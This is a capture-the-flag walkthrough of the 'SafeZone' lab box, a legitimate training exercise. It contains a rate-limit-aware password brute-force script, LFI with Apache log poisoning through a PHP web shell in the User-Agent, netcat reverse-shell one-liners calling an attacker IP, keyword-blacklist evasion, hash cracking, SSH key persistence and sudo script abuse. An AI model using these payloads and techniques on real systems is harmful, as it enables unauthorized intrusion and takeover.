# SafeZone - Medium

* Add ```safezone.thm``` to ```/etc/hosts``` and start scan - ```nmap -T4 -p- -A -Pn -v safezone.thm```:

  * 22/tcp - ssh - OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
  * 80/tcp - http - Apache httpd 2.4.29 ((Ubuntu))

* The webpage on port 80 does not contain anything significant - we will have to do web enumeration:

  ```sh
  gobuster dir -u http://safezone.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,bak,jpg,zip,bac,sh,png,md,jpeg,pl,ps1 -t 25
  # directory scan
  ```

* The directory scan gives us the following:

  * /register.php
  * /news.php
  * /index.php
  * /detail.php
  * /logout.php
  * /dashboard.php
  * /note.txt

* We can access a signup page at /register.php and a login form at /index.php

* Trying default credentials like admin:admin does not work at /index.php, and we get a lockout message in 3 attempts, so better not to try this at the moment

* /note.txt has a note from 'admin' - it mentions the password is stored in ```/home/files/pass.txt``` - this gives us another username 'files'

* After creating a test account in the signup page, we can login using the same creds - this leads us to /dashboard.php. We can use Burp Suite and check each of the pages functionality.

* /news.php mentions LFI and RCE, so it's possible we can have a web vulnerability in one of these pages

* The source code of /detail.php gives us a clue - to use 'page' as a GET parameter

* We can do a quick fuzzing test using some of the wordlists with payloads for LFI and RCE:

  ```sh
  ffuf -w /usr/share/seclists/Fuzzing/UnixAttacks.fuzzdb.txt -u "http://safezone.thm/detail.php?page=FUZZ" -b "PHPSESSID=fa39kali2aog5551ia8sro7iqs"
  # we need to include the cookie value
  # otherwise we will get the login page redirects

  ffuf -w /usr/share/seclists/Fuzzing/UnixAttacks.fuzzdb.txt -u "http://safezone.thm/detail.php?page=FUZZ" -b "PHPSESSID=fa39kali2aog5551ia8sro7iqs" -fs 1280
  # size filtered

  # test with other wordlists
  ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u "http://safezone.thm/detail.php?page=FUZZ" -b "PHPSESSID=fa39kali2aog5551ia8sro7iqs" -fs 1280
  ```

* Now, we do not get anything from the above fuzzing, and similar results are seen with other wordlists and even other pages

* We can take a step back and do directory scanning with another wordlist to ensure nothing has been missed:

  ```sh
  gobuster dir -u http://safezone.thm -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -x txt,php,html,bak,jpg,zip,bac,sh,png,md,jpeg,pl,ps1 -t 25

  gobuster dir -u http://safezone.thm -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x txt,php,html,bak,jpg,zip,bac,sh,png,md,jpeg,pl,ps1 -t 25
  ```

* From one of these wordlists, we get another directory '~files'

* Navigating to this directory, we have the 'pass.txt' file, which gives us admin password hint - "admin__admin", where the two underscores represent numbers

* We can generate a list of passwords that follow the above format:

  ```sh
  crunch 12 12 -t admin%%admin -o safezone.txt
  # % for numbers
  ```

* Back to the /index.php form, we do not have the initial lockout message. Furthermore, from the working of the website, we can see a rate limit of 60 seconds is set after every 3 attempts.

* We can create a script now to bruteforce admin's password after intercepting a sample login request to understand data format:

  ```py
  import requests
  import time

  pass_file = "safezone.txt"
  url = "http://safezone.thm/index.php"
  lock_time = 60
  attempts_limit = 3
  lock_message = "Please login after"
  number_of_attempts = 0

  with open(pass_file, "r") as fh:
    for fline in fh:
      
      password = fline.rstrip()
      # remove newline

      data = {
        "username": "admin",
        "password": password,
        "submit": "Submit"
      }

      res = requests.post(url, data=data)

      number_of_attempts += 1

      if "Please enter valid" in res.text:
        print("[-] Invalid password: {}".format(password))
      elif lock_message in res.text:
        print("[-] Invalid password: {}".format(password))
        print("[-] Hit rate limit, sleeping 60")
        time.sleep(lock_time+0.5)
      else:
        print("[+] Valid password: {}".format(password))
        sys.exit()
  ```

  ```sh
  python3 bruteforce.py
  ```

* After running the script, we get the password "admin44admin" - we can login using this

* As admin, we are able to access a feature on /detail.php - we have an input form with the placeholder text 'user' and submit button labelled 'whoami'

* When we run this, we get a popup saying the details have been saved to a file, and a JSON response is shown:

  ```json
  {"id":"553","username":"user","password":"user","is_admin":"false"}
  ```

* Similarly, for user 'admin':

  ```json
  {"id":"553","username":"user","password":"user","is_admin":"false"}
  ```

* For non-existing users, we get 'null'; also, if we try any command injection methods we get the same response.

* We can try the 'page' parameter here and see if there is any difference in response.

* When we try to access other PHP pages from the same directory - <http://safezone.thm/detail.php?page=news.php>, for example - we are able to see that page here.

* Using Burp Suite's Repeater, we can test for common LFI payloads fuzzed with the 'page' parameter, in two cases - one with the GET request to '/detail.php?page=payload', and one with the POST request to '/detail.php?page=payload' (which includes the user data)

* We can see that in both cases, even a simple payload like ```/detail.php?page=/etc/passwd``` works, and we are able to see the output of the file

* Using this LFI, we can get RCE now using log poisoning techniques:

  * First, we can check if a server log poisoning method is possible or not - as Apache is being used, we can check a common location of files such as ```access.log``` or ```error.log``` as LFI payload:

    ```http://safezone.thm/detail.php?page=/var/log/apache2/access.log```
  
  * As we can read the file in the response, we can now test by modifying the User-Agent header to a test value 'TEST' (this can be done in Burp Suite's Repeater)

  * After a couple of requests, we can see this custom user-agent value in the Apache access logs

  * Now, we can poison the User-Agent header value with a basic PHP web shell payload:

    ```<?php system($_GET['cmd']); ?>```

  * Finally, we achieve RCE by adding the 'cmd' parameter in our LFI payload:

    ```http://safezone.thm/detail.php?page=/var/log/apache2/access.log&cmd=id```
  
  * To convert this into a reverse shell, we can start a listener on attacker machine using ```nc -nvlp 4444``` and using a URL-encoded reverse-shell one-liner payload:

    ```http://safezone.thm/detail.php?page=/var/log/apache2/access.log&cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.10.130.30%204444%20%3E%2Ftmp%2Ff```

* We have a reverse shell now:

  ```sh
  # stabilize the reverse shell
  python3 -c 'import pty;pty.spawn("/bin/bash")'

  export TERM=xterm

  # Ctrl+Z
  stty raw -echo; fg
  # press Enter twice now

  ls -la
  # enumerate web directory

  # enumerate other directories too

  ls -la /home
  # we have two users - files and yash

  ls -la /home/files
  # we have an interesting file here

  file /home/files/'.something#fake_can@be^here'

  cat /home/files/'.something#fake_can@be^here'
  # this gives us a hash for 'files' user

  # hash identifier says it is a sha512crypt $6$ hash

  # in attacker machine
  vim sha512hash
  # paste the hash here

  hashcat -m 1800 -a 0 sha512hash /usr/share/wordlists/rockyou.txt
  # this cracks the hash
  # gives us the passphrase 'magic'
  ```

* We can try to SSH as the 'files' user using the above password:

  ```sh
  ssh files@safezone.thm
  # the SSH works

  sudo -l
  # this shows we can run '/usr/bin/id' as user 'yash'

  sudo -u yash id
  # shows id output as 'yash'
  # we do not have any exploit for 'id' on GTFOBins or Google

  # keep enumerating other directories

  # check internal services
  ss -ltnp
  # this shows ports 3306 and 8000

  # 3306 is for MySQL
  # we can try a few possible logins using no password and known passwords like 'admin44admin' and 'magic'
  mysql -u root -p

  mysql -u file -p

  mysql -u yash -p

  # none of the above combinations work

  # check port 8000
  curl http://localhost:8000
  # we get a 403 Forbidden page
  ```

* As we are unable to access the internal page on port 8000, we can attempt port forwarding and see if it still persists:

  ```sh
  ssh files@safezone.thm -L 8081:127.0.0.1:8000
  # port forwarding
  # we can check if we are able to access the internal service, on port 8081 in attacker machine

  # in attacker machine
  curl http://localhost:8081
  # we still get 403 Forbidden

  # we can do directory scanning to check for any hidden directories or files
  gobuster dir -u http://localhost:8081 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,bak,jpg,zip,bac,sh,png,md,jpeg,pl,ps1 -t 25
  ```

* The directory scan gives us the pages /login.html and /pentest.php - we can check this on our browser as well

* /login.html is a login form with username and password; we will come back to this later

* /pentest.php includes an input form with the placeholder 'Message for Yash' and has a 'Submit Query' button.

* The page just seems to print whatever message we feed into it. Using Burp Suite, we can intercept a request to check further

* From testing basic payloads, the app seems to blacklist certain keywords and characters such as 'id', 'whoami', ';' and '`', and these are removed from the response.

* Furthermore, the 'msg' parameter seems to accept payloads such as ```cat /etc/passwd```, but we do not see any output.

* However, when we use commands such as ```touch /tmp/testing.txt```, it works. When we do a ```ls -la /tmp``` from the SSH session as 'files' user, we can see there is a 'testing.txt' file created by user 'yash'. So we have command execution as 'yash'

* As multiple strings are blacklisted, we can trick the app into executing a reverse-shell as 'yash' - we can create a shell as 'files', but it should be executed by 'yash':

  ```sh
  # in 'files' SSH session
  cd /tmp

  echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.130.30 4445 >/tmp/f" > revshell

  chmod +x revshell

  # in attacker machine
  nc -nvlp 4445
  ```

* Now, if we submit the query ```/tmp/revshell```, we get a reverse shell from 'yash':

  ```sh
  # on listener on port 4445
  id
  # we are 'yash'

  # stabilise shell like before

  ls -la
  # we are in /opt
  
  cat login.js
  # this shows creds for the login.html page was user:pass
  # but it would have led to pentest.php anyway

  cat pentest.php
  # the page substituted multiple blacklisted words with empty character

  ls -la /home/yash
  
  cat /home/yash/flag.txt
  ```

* We can get a more stable SSH connection first:

  ```sh
  # in yash reverse shell
  mkdir ~/.ssh

  cd ~/.ssh

  # in attacker machine
  ssh-keygen -f yash
  # generates 'yash.pub' and 'yash' keys

  cat yash.pub
  # copy the public key

  md5sum yash.pub

  # in yash reverse shell
  echo "ssh-rsa..kali" > authorized_keys
  # paste the copy key into the file

  md5sum authorized_keys
  # verify the hash to ensure the key has been copied correctly

  chmod 600 authorized_keys

  # in attacker machine
  # we can SSH as yash now
  ssh yash@safezone.thm -i yash

  sudo -l
  # shows we can run a Python script as root
  # (root) NOPASSWD: /usr/bin/python3 /root/bk.py

  ls -la /root/bk.py
  # permission denied

  # we can try to run this
  sudo /usr/bin/python3 /root/bk.py
  ```

* When we run the binary as 'sudo', we get the prompts for 'filename', 'destination' and 'password' - we can test by entering filename as ```/home/yash/flag.txt```, destination as ```/tmp/flag.txt```, and password as 'password'

* After the inputs, the script exits; and ```cat /tmp/flag.txt``` shows that the flag has actually been copied; we can follow this technique to copy the root flag from ```/root/root.txt``` and read it.
